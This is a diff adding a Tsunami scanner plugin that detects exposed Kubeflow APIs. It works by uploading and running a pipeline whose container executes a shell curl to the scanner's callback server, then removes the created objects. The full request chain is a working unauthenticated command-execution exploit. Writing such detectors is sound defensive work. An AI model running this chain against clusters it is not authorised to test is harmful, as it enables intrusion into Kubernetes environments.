@@ -1,0 +1,275 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Kubeflow_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "grandsilva for the original Java version"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "KUBEFLOW_EXPOSED_API_RCE"
+  }
+  severity: CRITICAL
+  title: "Exposed Kubeflow API"
+  description:
+    "The Kubeflow Central Dashboard and Pipelines API are exposed without "
+    "authentication. An attacker can upload and run an arbitrary pipeline, "
+    "resulting in OS command execution inside the Kubernetes cluster. This was "
+    "confirmed by running a pipeline that contacts the Tsunami callback server."
+  recommendation: "Restrict access to the Kubeflow API and enforce authentication (e.g. via Dex/OIDC and Istio) in front of the Kubeflow Central Dashboard."
+}
+
+config: { debug: true }
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "kubeflow_fingerprint"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Kubeflow Central Dashboard</title>" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "get_namespace"
+  http_request: {
+    method: GET
+    uri: "/api/workgroup/env-info"
+    headers: [
+      { name: "Accept" value: "application/json" }
+    ]
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"namespace\"\\s*:\\s*\"([^\"]+)\""
+            variable_name: "namespace"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_experiment"
+  http_request: {
+    method: POST
+    uri: "/pipeline/apis/v2beta1/experiments"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{"description":"","display_name":"TsunamiExperiment-{{ T_UTL_CURRENT_TIMESTAMP_MS }}","namespace":"{{ namespace }}"}'
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"experiment_id\"\\s*:\\s*\"([^\"]+)\""
+            variable_name: "experiment_id"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "upload_pipeline"
+  http_request: {
+    method: POST
+    uri: "/pipeline/apis/v2beta1/pipelines/upload?name=TsunamiPipeline-{{ T_UTL_CURRENT_TIMESTAMP_MS }}&description=&namespace={{ namespace }}"
+    headers: [
+      { name: "Content-Type" value: "multipart/form-data; boundary=----TsunamiKubeflowBoundary" }
+    ]
+    data:
+      '------TsunamiKubeflowBoundary\r\n'
+      'Content-Disposition: form-data; name="uploadfile"; filename="examplePipeline.yaml"\r\n'
+      'Content-Type: application/yaml\r\n'
+      '\r\n'
+      'apiVersion: argoproj.io/v1alpha1\n'
+      'kind: Workflow\n'
+      'metadata:\n'
+      '  generateName: v2-container-component-no-input-\n'
+      '  annotations:\n'
+      '    pipelines.kubeflow.org/kfp_sdk_version: 2.0.0-beta.0\n'
+      '    pipelines.kubeflow.org/pipeline_compilation_time: \'2025-08-09T16:05:29Z\'\n'
+      '    pipelines.kubeflow.org/pipeline_spec: \'{"name":"v2-container-component-no-input","schemaVersion":"2.1.0"}\'\n'
+      'spec:\n'
+      '  entrypoint: v2-container-component-no-input\n'
+      '  templates:\n'
+      '    - name: v2-container-component-no-input\n'
+      '      dag:\n'
+      '        tasks:\n'
+      '          - name: hello-world-container\n'
+      '            template: hello-world-container\n'
+      '    - name: hello-world-container\n'
+      '      container:\n'
+      '        image: alpine/curl:8.12.1\n'
+      '        command:\n'
+      '          - sh\n'
+      '          - -c\n'
+      '          - \'curl {{ T_CBS_URI }}\'\r\n'
+      '------TsunamiKubeflowBoundary--\r\n'
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"pipeline_id\"\\s*:\\s*\"([^\"]+)\""
+            variable_name: "pipeline_id"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "get_pipeline_version"
+  http_request: {
+    method: GET
+    uri: "/pipeline/apis/v2beta1/pipelines/{{ pipeline_id }}/versions?page_size=1&sort_by=created_at%20desc"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"pipeline_version_id\"\\s*:\\s*\"([^\"]+)\""
+            variable_name: "pipeline_version_id"
+          }
+        ]
+      }
+    }
+  }
+  # Cleanups run in registration order: versions must be deleted before the pipeline.
+  cleanup_actions: ["cleanup_pipeline_version", "cleanup_pipeline"]
+}
+
+actions: {
+  name: "create_run"
+  http_request: {
+    method: POST
+    uri: "/pipeline/apis/v2beta1/runs"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{"description":"","display_name":"TsunamiRun-{{ T_UTL_CURRENT_TIMESTAMP_MS }}","experiment_id":"{{ experiment_id }}","pipeline_version_reference":{"pipeline_id":"{{ pipeline_id }}","pipeline_version_id":"{{ pipeline_version_id }}"},"runtime_config":{"parameters":{}},"service_account":""}'
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"run_id\"\\s*:\\s*\"([^\"]+)\""
+            variable_name: "run_id"
+          }
+        ]
+      }
+    }
+  }
+  # Runs should be deleted before their experiment.
+  cleanup_actions: ["cleanup_run", "cleanup_experiment"]
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 25000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+###################
+# CLEANUP ACTIONS #
+###################
+
+actions: {
+  name: "cleanup_pipeline_version"
+  http_request: {
+    method: DELETE
+    uri: "/pipeline/apis/v2beta1/pipelines/{{ pipeline_id }}/versions/{{ pipeline_version_id }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_pipeline"
+  http_request: {
+    method: DELETE
+    uri: "/pipeline/apis/v2beta1/pipelines/{{ pipeline_id }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_run"
+  http_request: {
+    method: DELETE
+    uri: "/pipeline/apis/v2beta1/runs/{{ run_id }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_experiment"
+  http_request: {
+    method: DELETE
+    uri: "/pipeline/apis/v2beta1/experiments/{{ experiment_id }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "kubeflow_fingerprint",
+    "get_namespace",
+    "create_experiment",
+    "upload_pipeline",
+    "get_pipeline_version",
+    "create_run",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
